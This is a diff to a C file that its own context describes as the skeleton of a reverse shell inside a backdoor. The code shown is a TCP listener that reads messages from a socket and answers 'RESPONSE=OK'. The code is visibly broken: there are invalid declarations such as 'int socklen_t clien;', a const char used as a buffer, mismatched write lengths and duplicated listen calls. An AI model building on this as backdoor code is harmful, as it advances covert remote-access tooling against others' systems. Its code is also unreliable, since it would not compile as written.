@@ -24,7 +24,7 @@ a skelleton of reverse shell contained in the backdoor. */
 
   int listenfd;
 
-  socklen_t clilen;
+  //socklen_t clien;
 
   int n;
   /* int persistency;  run a thread function to keep connection aliv */
@@ -43,7 +43,9 @@ a skelleton of reverse shell contained in the backdoor. */
   const unsigned int newsockfd;
   const char cmd;
   const unsigned int listenfd;
-  /*const socklen_t clien; */
+ 
+  int socklen_t clien; 
+
   const unsigned int n;
 
   sockfd = socket(AF_INET, SOCK_STREAM, 0);
@@ -53,7 +55,7 @@ a skelleton of reverse shell contained in the backdoor. */
     perror("setsockopt(SO_REUSEADDR) failed");
 
   memset(&serv_addr, '0', sizeof(serv_addr));
-  memset(cmd, NULL , sizeof(cmd));
+  memset(cmd, '0' , sizeof(cmd));
 
   serv_addr.sin_family = AF_INET;
   serv_addr.sin_addr.s_addr = htonl(IP);
@@ -63,10 +65,10 @@ a skelleton of reverse shell contained in the backdoor. */
 
   listen(listenfd, 10);
 
-  printf("about to listen\n");
+  //printf("about to listen\n");
      listen(sockfd,5);
      clien = sizeof(serv_addr);
-     //printf("About to accept\n");
+    // printf("About to accept\n");
 
      int i;
 
@@ -80,8 +82,8 @@ a skelleton of reverse shell contained in the backdoor. */
          bzero(cmd,256);
          n = read(newsockfd,cmd,255);
          if (n < 0) error("ERROR reading from socket");
-         printf("Here is the message: %s\n",cmd);
-         n = write(newsockfd,"I got your message",18);
+         printf("Package > %s\n",cmd);
+         n = write(newsockfd,"RESPONSE=OK",18);
          if (n < 0) error("ERROR writing to socket");
          close(newsockfd);
      }
